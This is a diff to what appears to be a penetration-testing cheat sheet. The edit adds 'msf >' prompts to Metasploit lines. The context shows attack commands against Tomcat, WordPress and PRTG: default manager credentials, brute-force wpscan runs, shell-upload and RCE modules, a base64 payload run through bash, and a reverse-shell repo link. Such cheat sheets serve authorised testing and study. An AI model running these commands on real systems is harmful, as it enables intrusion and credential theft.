@@ -1020,8 +1020,8 @@ $ java -jar target/RogueJndi-1.1.jar --command "bash -c {echo,<base64 payload>} 
 ```
 http://<IP address>:<port>/manager/html
 tomcat:s3cret
-use auxiliary/scanner/http/tomcat_mgr_login
-use exploit/multi/http/tomcat_mgr_upload
+msf > use auxiliary/scanner/http/tomcat_mgr_login
+msf > use exploit/multi/http/tomcat_mgr_upload
 $ python3 mgr_brute.py -U <URL> -P /manager -u /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_users.txt -p /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_pass.txt
 ```
 
@@ -1033,7 +1033,7 @@ $ curl -s <URL> | grep plugins
 $ sudo wpscan --url <URL> -e u,ap,at,cb,dbe
 $ sudo wpscan --password-attack xmlrpc -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url <URL>
 $ sudo wpscan --password-attack wp-login -t 20 -U admin -P /usr/share/wordlists/rockyou.txt --url <URL>
-use exploit/unix/webapp/wp/admin_shell_upload
+msf > use exploit/unix/webapp/wp/admin_shell_upload
 ```
 
 - Joomla
@@ -1114,7 +1114,7 @@ https://github.com/0xjpuff/reverse_shell_splunk
 ```
 C:\ProgramData\Paessler\PRTG Network Monitor\PRTG Configuration.dat
 https://github.com/shk0x/PRTG-Network-Monitor-RCE/blob/master/prtg-exploit.sh
-use exploit/windows/http/prtg_authenticated_rce
+msf > use exploit/windows/http/prtg_authenticated_rce
 ```
 
 - Juicy Potato
